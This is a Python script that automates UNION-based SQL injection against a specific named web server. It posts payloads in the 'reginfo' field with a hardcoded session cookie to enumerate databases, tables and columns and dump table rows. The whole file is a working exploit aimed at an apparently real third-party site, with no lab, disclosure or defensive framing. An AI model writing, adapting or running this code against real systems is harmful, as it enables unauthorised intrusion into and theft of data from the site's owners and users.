import requests
import re

URL = "http://file.worlddivision.or.kr:8080/am/manage/logDetail.dat.php"
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0",
    "Cookie": "C_VX_User=4bba9amcnamdrvcg3tgbhS"
}

def send_payload(payload):
    data = {"reginfo": payload}
    try:
        resp = requests.post(URL, headers=HEADERS, data=data)
        if resp.status_code == 200:
            return resp.text
    except Exception as e:
        print(f"[!] Request error: {e}")
    return None

def extract_result(text):
    matches = re.findall(r'~(.*?)~', text)
    return matches[0] if matches else None

def get_all_databases():
    payload = "1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7e,(SELECT group_concat(schema_name) FROM information_schema.schemata),0x7e)#"
    resp = send_payload(payload)
    return extract_result(resp)

def get_tables(db):
    payload = f"1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='{db}'),0x7e)#"
    resp = send_payload(payload)
    return extract_result(resp)

def get_columns(db, table):
    payload = f"1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db}'),0x7e)#"
    resp = send_payload(payload)
    return extract_result(resp)

def dump_table(db, table, columns, limit=10):
    cols = ',0x3a,'.join(columns.split(','))
    payload = f"1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7e,(SELECT group_concat(CONCAT_WS(':',{cols})) FROM {table} LIMIT {limit}),0x7e)#"
    resp = send_payload(payload)
    return extract_result(resp)

def choose_from_list(name, items):
    print(f"\nSelect {name}:")
    for i, item in enumerate(items):
        print(f"  [{i}] {item}")
    while True:
        try:
            idx = int(input(f"Enter {name} index: ").strip())
            if 0 <= idx < len(items):
                return items[idx]
        except:
            pass
        print("Invalid input. Try again.")

def interactive():
    print("== SQLi Interactive Shell ==")

    # Step 1: Get all databases
    raw_dbs = get_all_databases()
    if not raw_dbs:
        print("[!] Failed to retrieve databases.")
        return

    db_list = raw_dbs.split(',')
    selected_db = choose_from_list("database", db_list)

    # Step 2: Get tables
    raw_tables = get_tables(selected_db)
    if not raw_tables:
        print("[!] Failed to retrieve tables.")
        return
    table_list = raw_tables.split(',')
    selected_table = choose_from_list("table", table_list)

    # Step 3: Get columns
    raw_columns = get_columns(selected_db, selected_table)
    if not raw_columns:
        print("[!] Failed to retrieve columns.")
        return
    print(f"\n[Columns] {raw_columns}")

    # Step 4: Dump data
    data = dump_table(selected_db, selected_table, raw_columns)
    print(f"\n[Data] {data}")

if __name__ == "__main__":
    interactive()
